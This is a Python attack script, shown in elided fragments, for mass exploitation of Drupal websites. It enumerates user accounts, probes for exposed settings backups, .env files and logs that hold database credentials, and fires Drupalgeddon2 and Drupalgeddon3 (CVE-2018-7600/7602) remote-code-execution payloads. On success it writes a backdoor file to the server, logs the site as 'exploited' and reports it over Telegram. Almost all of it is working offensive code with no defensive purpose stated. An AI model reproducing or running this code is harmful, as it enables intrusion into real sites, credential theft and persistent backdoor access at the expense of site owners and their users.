...
# Drupal Username Enumeration Functions
def enumerate_drupal_usernames(site_base):
    """Enumerate Drupal usernames"""
    usernames = set()
    
    # Try common user enumeration paths
    for i in range(1, 11):  # Check first 10 user IDs
        try:
            user_url = f"{site_base}/user/{i}"
            resp = session.get(user_url, timeout=10, verify=False)
            if resp.status_code == 200:
                # Extract username from page title or profile
                title_match = re.search(r'<title>(.*?)<\/title>', resp.text, re.IGNORECASE)
                if title_match:
                    title = title_match.group(1)
                    # Common Drupal user page title format: "Profile | Username | Site Name"
                    parts = title.split('|')
                    if len(parts) >= 2:
                        username = parts[1].strip()
                        if username and username != "User account":
                            usernames.add(username)
                            print(f"{GREEN}[+] Drupal username found: {username}{Style.RESET_ALL}")
        except:
            pass
    
    # Try REST API endpoint if available
    try:
        rest_url = f"{site_base}/user/login"
        resp = session.get(rest_url, timeout=10, verify=False)
        if resp.status_code == 200:
            # Look for user-related patterns in response
            user_matches = re.findall(r'user\/(\d+)', resp.text)
            for user_id in user_matches:
                user_profile_url = f"{site_base}/user/{user_id}"
                try:
                    profile_resp = session.get(user_profile_url, timeout=10, verify=False)
                    if profile_resp.status_code == 200:
                        title_match = re.search(r'<title>(.*?)<\/title>', profile_resp.text, re.IGNORECASE)
                        if title_match:
                            title = title_match.group(1)
                            parts = title.split('|')
                            if len(parts) >= 2:
                                ...
                                if username and username != "User account":
                                    usernames.add(username)
                                    print(f"{GREEN}[+] Drupal username via REST: {username}{Style.RESET_ALL}")
                except:
                    pass
    except:
        pass
    ...
    for path in admin_paths:
        try:
            ...
            if resp.status_code == 200:
                ...
                if "drupal" in content or "login" in content or "user" in content:
...
def test_sensitive_files(site_base):
    ...
    sensitive_paths = [
        ...
        "/sites/default/settings.php.sample",
        "/sites/default/settings.php.save.1",
        "/sites/default/settings.php.save.2",
        "/sites/default/settings.php.save.3",
        "/sites/default/settings.php.bak.1",
        "/sites/default/settings.php.bak.2",
        "/sites/default/settings.php.bak.3",
        ...
        "/sites/default/settings.php.temp",
        "/.env",
        "/.env.backup",
        "/.env.bak",
        "/.env.save",
        ...
        "/sites/default/files/php/error.log",
        "/sites/default/files/php/access.log",
        "/error.log",
        "/access.log"
    ]
    ...
    for path in sensitive_paths:
        try:
            ...
            if resp.status_code == 200:
                ...
                if "database" in content.lower() and ("username" in content.lower() or "password" in content.lower()):
...
def exploit_drupal_rce(site_base):
    """Exploit Drupal RCE vulnerabilities"""
    try:
        # Test for Drupalgeddon2 (CVE-2018-7600)
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': 'echo "MARIJUANA — DIOS — NO — CREA — NADA — EN — VANO —"'
        }
        
        exploit_url = f"{site_base}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        
        try:
            resp = session.post(exploit_url, data=payload, timeout=15, verify=False)
            if resp.status_code == 200 and "MARIJUANA — DIOS — NO — CREA — NADA — EN — VANO —" in resp.text:
                print(f"{YELLOW}[VULNERABLE] Drupalgeddon2 (CVE-2018-7600): {exploit_url}{Style.RESET_ALL}")
                with open(f'{RESULTS_DIR}/Vulnerable_Sites.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[VULNERABLE] Drupalgeddon2: {exploit_url}\n")
                ...
                # Try to upload via form
                upload_payload = {
                    'form_id': 'user_register_form',
                    '_drupal_ajax': '1',
                    'mail[#post_render][]': 'exec',
                    'mail[#type]': 'markup',
                    'mail[#markup]': f"echo '{backdoor_content}' > {backdoor_name}"
                }
                
                try:
                    upload_resp = session.post(exploit_url, data=upload_payload, timeout=15, verify=False)
                    if upload_resp.status_code == 200:
                        ...
                        backdoor_url = f"{site_base}/{backdoor_name}"
                        try:
                            ...
                            if test_resp.status_code == 200:
                                ...
                                if "MARIJUANA — DIOS — NO — CREA — NADA — EN — VANO —" in content:
                                    ...
                                    # Send Telegram notification
                                    telegram_message = (
                                        f"✅ <b>Drupal Backdoor Accessible</b>\n"
        ...
        # Test for Drupalgeddon3 (CVE-2018-7602)
        try:
            exploit_url2 = f"{site_base}/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
            payload2 = {
                'form_id': 'user_register_form',
                '_drupal_ajax': '1',
                'timezone[#post_render][]': 'exec',
                'timezone[#type]': 'markup',
                'timezone[#markup]': 'echo "MARIJUANA — DIOS — NO — CREA — NADA — EN — VANO —"'
            }
            
            resp2 = session.post(exploit_url2, data=payload2, timeout=15, verify=False)
            if resp2.status_code == 200 and "MARIJUANA — DIOS — NO — CREA — NADA — EN — VANO —" in resp2.text:
                print(f"{YELLOW}[VULNERABLE] Drupalgeddon3 (CVE-2018-7602): {exploit_url2}{Style.RESET_ALL}")
                with open(f'{RESULTS_DIR}/Vulnerable_Sites.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[VULNERABLE] Drupalgeddon3: {exploit_url2}\n")
                found_exploits["VULNERABLE"] += 1
                ...
                upload_payload2 = {
                    ...
                    'timezone[#post_render][]': 'exec',
                    'timezone[#type]': 'markup',
                    'timezone[#markup]': f"echo '{backdoor_content}' > {backdoor_name}"
                }
                
                try:
                    upload_resp2 = session.post(exploit_url2, data=upload_payload2, timeout=15, verify=False)
                    if upload_resp2.status_code == 200:
                        print(f"{GREEN}[EXPLOITED] Backdoor deployed: {backdoor_name}{Style.RESET_ALL}")
                        with open(f'{RESULTS_DIR}/Exploited_Sites.txt', 'a', encoding='utf-8') as f:
                            f.write(f"[EXPLOITED] {exploit_url2} -> {backdoor_name}\n")
                        found_exploits["EXPLOITED"] += 1
...
def exploit_site(target):
    ...
    # Enumerate usernames
    enumerate_drupal_usernames(site_base)
    
    # Test all RCE vulnerabilities
    exploit_drupal_rce(site_base)
...
def main():
    ...
    print(f"\n{CYAN}Drupal RCE exploitation completed in {end - start:.2f} seconds.{Style.RESET_ALL}")
    print_stats()
